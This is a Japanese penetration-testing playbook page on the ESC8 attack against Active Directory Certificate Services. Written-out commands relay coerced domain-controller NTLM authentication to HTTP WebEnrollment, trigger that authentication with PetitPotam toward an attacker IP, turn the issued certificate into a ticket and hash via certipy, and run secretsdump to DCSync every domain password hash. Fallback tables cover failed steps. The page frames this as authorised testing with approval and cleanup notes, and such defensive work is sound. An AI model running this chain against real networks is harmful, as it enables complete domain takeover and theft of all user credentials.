# ESC8 — NTLM Relay to AD CS HTTP WebEnrollment

> **スコープ**: AD CS の WebEnrollment が HTTP で稼働している場合に、Coerce 系で DC$ の認証を強制して AD CS へリレーし「DC$ の証明書」を取得〜DCSync まで扱う。Relay の詳細は `../NTLM_Relay/ntlmrelayx.md`（§5）を参照。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（DC$ への Coerce は DC に直接 RPC 呼び出しを行う）
> - [x] 持続化に該当（取得した DC$ 証明書はパスワードリセット後も有効）
> - [x] SIEM/EDR で確実に検知される（MDI「NTLM Relay to ADCS」アラート / Event ID 4886・4887・4768）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。DC への Coerce と WebEnrollment への Relay は書面承認必須。演習環境では制約なし。

## 着火条件

- AD CS の WebEnrollment エンドポイントが **HTTP（非 HTTPS）** でアクセス可能
- DC$ などのマシンアカウントの認証フローを Relay できる手段がある（Coerce 系 / LLMNR ポイズニング等）
- `DomainController` テンプレートまたは同等のテンプレートが存在し、マシンアカウントが Enrollment 権限を持つ

## 環境前提
- 実行環境: テスター端末（root 権限必要）
- 必要なツール: `ntlmrelayx`（Impacket 付属・標準搭載）/ Coerce 系ツール（`Coerce.md` 参照）/ `certipy`（`pip install certipy-ad`）

## 先に確認すること

```bash
# [Attacker] WebEnrollment エンドポイントの存在確認
curl -k http://[CA_SERVER]/certsrv/
# → HTTP 401 が返ってくれば WebEnrollment が HTTP で動いている → ESC8 可能
# → 接続拒否 / 404 → WebEnrollment がない、またはアクセス不可
```

**攻撃者の思考トレース:** AD CS の WebEnrollment が HTTP で稼働している場合、NTLM 認証リレーを受け付ける。DC 自身に PetitPotam / PrinterBug などで認証を強制させ、その NTLM 認証フローを AD CS HTTP エンドポイントにリレーすることで「DC$ の証明書」を取得できる。AD の署名設定（SMB Signing / LDAP Signing）に関係なく成立する。

---

## 1. WebEnrollment エンドポイントの確認

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `curl` が HTTP 401 を返す | WebEnrollment が HTTP で稼働 → ESC8 可能 | §2 ntlmrelayx 起動へ |
| HTTPS のみで稼働 | Extended Protection for Authentication が有効な場合は Relay 不可の場合がある | `--no-pass` オプション付きで ntlmrelayx を試す |
| WebEnrollment が存在しない（404）| ESC8 は使えない | ESC1〜ESC7 の別経路を探す |

---

## 2. ntlmrelayx を ESC8 モードで起動

**事前準備（必須）:** Responder.conf の SMB / HTTP を Off にしてから起動。

**コマンド:**

```bash
# [Attacker] ntlmrelayx を AD CS HTTP エンドポイントにリレー設定で起動
ntlmrelayx.py \
  -t http://[CA_SERVER]/certsrv/certfnsh.asp \
  --adcs \
  --template DomainController
# --template には DomainController または ESC8 に脆弱なカスタムテンプレートを指定
```

詳細コマンド → `../NTLM_Relay/ntlmrelayx.md`（§5）

---

## 3. DC$ の認証を Coerce で強制発生させる

ntlmrelayx が待機状態になったら、Coerce で DC$ の認証フローを発生させる。

**コマンド:**

```bash
# [Attacker] PetitPotam で DC$ の認証を強制（別ターミナルで実行）
impacket-petitpotam -u [USER] -p [PASSWORD] -d [DOMAIN] [ATTACKER_IP] [DC_IP]
# → ntlmrelayx 側に DC$ の認証フローが届き、WebEnrollment に Relay される
# → 成功すると ntlmrelayx が「Got certificate...」と DC$ の証明書（Base64 PFX）を出力する
```

詳細 → `../NTLM_Relay/Coerce.md`

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Got certificate for ...` と Base64 PFX が出力 | DC$ 証明書取得成功 | §4 PKINIT 認証へ |
| Coerce が失敗する（DC$ 認証が来ない）| PetitPotam が適用外 | PrinterBug / DFSCoerce を順に試す → `../NTLM_Relay/Coerce.md` |

---

## 4. DC$ 証明書で PKINIT 認証 → DCSync

**コマンド:**

```bash
# [Attacker] Base64 PFX からバイナリ pfx に変換
echo "[BASE64_PFX_STRING]" | base64 -d > dc.pfx

# [Attacker] PKINIT 認証 → DC$ TGT + NT ハッシュ取得
certipy auth -pfx dc.pfx -dc-ip [DC_IP]
# → DC$ の TGT（dc.ccache）と NT ハッシュが取得される

# [Attacker] DC$ の NT ハッシュで DCSync
impacket-secretsdump -just-dc-ntlm -no-pass -hashes :[DC_NT_HASH] [DOMAIN]/[DC_HOSTNAME]$@[DC_IP]

# [Attacker] または DC$ TGT で Pass-the-Ticket
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass -just-dc-ntlm -target-ip [DC_IP] [DC_HOSTNAME]$@[DC_FQDN]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 全ドメインユーザーのハッシュが出力される | DCSync 成功 → ドメイン完全制御 | `../Credential_Dumping.md`（取得情報の管理）|
| `KDC_ERR_CLIENT_NOT_TRUSTED` | 発行した証明書が DC に信頼されていない | Certipy で CA の NTAuthCertificates 登録を確認 |

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| WebEnrollment が存在しない（curl で 404）| ESC8 は不可。ESC1〜ESC7 の別経路を探す |
| `Relay to http://[CA_SERVER]/certsrv/ failed` | Extended Protection for Authentication が有効な HTTPS 環境の可能性。HTTP でのみ稼働か確認 |
| Coerce が失敗する | 3 手法（PetitPotam / PrinterBug / DFSCoerce）を順に試す → `../NTLM_Relay/Coerce.md` |
| LLMNR が無効化されており自発的な認証が来ない | Coerce 系を使う。LLMNR が無効でも Coerce は有効 |

---

## 注意点・落とし穴

- **ESC8 は HTTP での WebEnrollment が前提**: HTTPS のみで Extended Protection for Authentication が有効な環境では NTLM Relay が困難
- **DC への Coerce は MDI でほぼ確実に検知される**: 本番では検知前提で書面合意を取る
- **Responder の SMB/HTTP を Off にしてから ntlmrelayx を起動**: ポート競合で両方が機能不全になる
- **ntlmrelayx が出力する証明書は Base64 PFX 形式**: `echo ... | base64 -d` でバイナリ pfx に変換してから `certipy auth` に渡す

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。DC への Coerce + WebEnrollment Relay + DCSync は多段階のドメイン全体操作
- **想定されるSIEM/EDR検知**: MDI「NTLM Relay to AD CS」アラート / MDI「Suspected DCE/RPC Exploitation Attempt」（Coerce 部分）/ Event ID 4886・4887・4768
- **業務影響リスク**: DC への Coerce は DC 負荷増加の可能性あり。業務時間外の実施を推奨
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効（`certipy ca -revoke [REQUEST_ID]`）/ ✅ pfx・TGT・NT ハッシュの暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と WebEnrollment エンドポイント確認 → `Overview.md`
- 前：NTLM Relay の全体手順（ESC8 は §5 に記載）→ `../NTLM_Relay/ntlmrelayx.md`
- 前：DC$ の認証強制（Coerce）→ `../NTLM_Relay/Coerce.md`
- 前：LLMNR 無効環境での代替起点（IPv6）→ `../NTLM_Relay/mitm6.md`
- 後：DC$ NT ハッシュ・TGT による DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
